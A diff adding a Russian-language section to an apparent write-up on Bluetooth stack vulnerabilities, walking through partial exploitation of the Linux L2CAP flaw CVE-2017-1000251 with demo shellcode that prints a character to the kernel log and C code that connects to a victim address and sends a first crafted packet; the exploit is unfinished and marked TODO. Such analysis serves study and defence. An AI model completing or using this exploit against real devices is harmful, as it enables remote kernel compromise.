@@ -183,3 +183,71 @@ int main(int argc, char *argv[]) {
 - перезаписать адрес возврата в стековом кадре. Как только функция завершается, управление передаётся по указанному атакующим адресу, обычно в область памяти, к изменению которой он имел доступ
 - перезаписать указатель на функцию или обработчик исключений, которые впоследствии получат управление
 #### Эксплуатация уязвимости CVE-2017-1000251
+В данном разделе я привожу объяснение возможного использования CVE-2017-1000251.
+Для простоты целью данного примера является исполнение следующего шелл-кода.
+```asm
+push 0x00433601 ; 0x43 - символ 'C'
+push esp
+mov ecx,esp
+mov eax,0xc1107803 ; 0xc1107803 - print_k
+call eax
+mov ebx, 0x4
+mov eax, 0xc109ec30 ; 0xc109ec30 - msleep_interruptible()
+call eax
+```
+То есть этот фрагмент выводит в логи ядра символ 'C'
+Перед исполнением нужно отключить stack-protector и ASLR (рандомизацию адресного пространства). Также нужно знать **BD_ADDR** (MAC-aдрес устройства жертвы).
+Для конструирования **L2CAP** пакета, узнаем вначале свой **BD_ADDR** и запишем оба адреса в соответствующие структуры:
+```c++
+struct hci_dev_info di;
+hci_devinfo(0, &di); // BD_ADDR теперь в di.bdaddr
+
+struct sockaddr_l2 laddr, raddr;
+// конструирование локального адреса
+laddr.l2_family = AF_BLUETOOTH;
+laddr.l2_bdaddr = di.bdaddr;
+laddr.l2_psm = htobs(0x1001);
+laddr.l2_cid = htobs(0x0040);
+
+// конструирование адреса жертвы
+memset(&raddr, 0, sizeof(raddr));        
+raddr.l2_family = AF_BLUETOOTH;
+str2ba(remote_address, &raddr.l2_bdaddr);
+```
+Откроем Bluetooth-сокет и привяжемся к нему:
+```c++
+// создание сокета	
+int sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
+
+// привязка к созданному сокету
+bind(sock, (struct sockaddr *) &laddr, sizeof(laddr));
+
+// установление соединения
+connect(sock, (struct sockaddr *) &raddr, sizeof(raddr));
+```
+Сформируем первый **L2CAP** пакет и отправим его:
+```c++
+buf = (char *) malloc (L2CAP_CMD_HDR_SIZE ));
+
+//выставление настроек опций в заголовке L2CAP 
+cmd = (l2cap_cmd_hdr *) buf;
+cmd->code = 0x02;
+cmd->ident = 0x03;
+cmd->len = htobs(4);
+
+// первый 0x00 - L2CAP_SERV_NOTRAFIC
+char payload2[]="\x01\x00\x40\x00";
+memcpy((buf + L2CAP_CMD_HDR_SIZE), payload2, 4);
+
+// отправление пакета
+send(sock, buf, L2CAP_CMD_HDR_SIZE + 4, 0)
+
+```
+TODO: code + conclusions
+#### Выводы
+
+В случае с BlueZ, уровень **L2CAP** включен в ядро Linux. Это решение не самое удачное в силу таких механизмов как **EFS**, потому что внедренный вредоносный код будет иметь наибольшие привилегии, что может привести к разрушительным последствиям. Это дает надежный эксплойт для атакующей стороны, требуется только включенный Bluetooth и знание MAC-адреса жертвы.
+
+# 2.2 SDP и уязвимости Bluetooth стеков  Linux и Android (CVE-2017-1000250 и CVE-2017-0785) 
+--------------------------------------
+Назначение протокола **SDP** (**service discovery protocol**) заключается в том, чтобы позволять устройствам Bluetooth понимать, какие сервисы и приложения поддерживают Bluetooth.  
